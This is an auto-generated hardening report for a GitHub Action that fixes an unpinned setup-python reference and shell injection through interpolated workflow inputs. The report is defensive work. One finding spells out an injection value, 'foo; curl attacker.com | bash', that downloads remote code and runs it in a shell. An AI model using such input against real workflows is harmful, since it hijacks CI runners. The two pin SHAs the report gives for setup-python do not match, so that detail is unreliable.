<!-- markdownlint-disable -->

# Hardening Report: rjtngit--nunit-html-action/v2.0.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **rjtngit--nunit-html-action/v2.0.0** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

action.yml uses `actions/setup-python@v6`, which is a mutable tag reference rather than a pinned 40-character commit SHA. This means the action could silently change to a different (potentially malicious) version without any notice. It should be pinned to a full SHA, e.g. `actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v6`.

Locations:

- `action.yml:14`

### script-injection (severity: high)

The `run:` block directly interpolates GitHub Actions expressions into shell command strings (sub-rule a). Specifically:
- `${{ github.action_path }}` is interpolated twice into shell commands (pip install and python invocation).
- `${{ inputs.inputXmlPath }}` is interpolated directly as a positional argument to `python main.py` — this is fully caller-controlled and allows arbitrary shell metacharacter injection (e.g. a value like `foo; curl attacker.com | bash` would execute).
- `${{ inputs.outputHtmlPath }}` is similarly interpolated directly as a positional argument.

All `${{ ... }}` expressions inside `run:` blocks are substituted by the Actions runner before the shell ever sees the string, bypassing any shell quoting. The fix is to pass these values through `env:` variables and reference them as properly double-quoted shell variables, e.g.:
```yaml
env:
  INPUT_XML_PATH: ${{ inputs.inputXmlPath }}
  OUTPUT_HTML_PATH: ${{ inputs.outputHtmlPath }}
  ACTION_PATH: ${{ github.action_path }}
run: |
  python -m pip install -r "$ACTION_PATH/requirements.txt"
  python "$ACTION_PATH/main.py" "$INPUT_XML_PATH" ${OUTPUT_HTML_PATH:+"$OUTPUT_HTML_PATH"}
```

Locations:

- `action.yml:19`
- `action.yml:20`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.inputXmlPath }}" appears directly in run: block of step "Run python script"; move to env: map

Locations:

- `action.yml:22`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.outputHtmlPath }}" appears directly in run: block of step "Run python script"; move to env: map

Locations:

- `action.yml:22`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

1. Pinned actions/setup-python@v6 to full SHA ece7cb06caefa5fff74198d8649806c4678c61a1 with a # v6 comment. 2. Moved all ${{ }} expressions (github.action_path, inputs.inputXmlPath, inputs.outputHtmlPath) into an env: block on the 'Run python script' step. Shell script now references them as double-quoted variables: "$ACTION_PATH", "$INPUT_XML_PATH", and ${OUTPUT_HTML_PATH:+"$OUTPUT_HTML_PATH"} (the last uses the conditional expansion to avoid passing an empty argument for the optional output path).

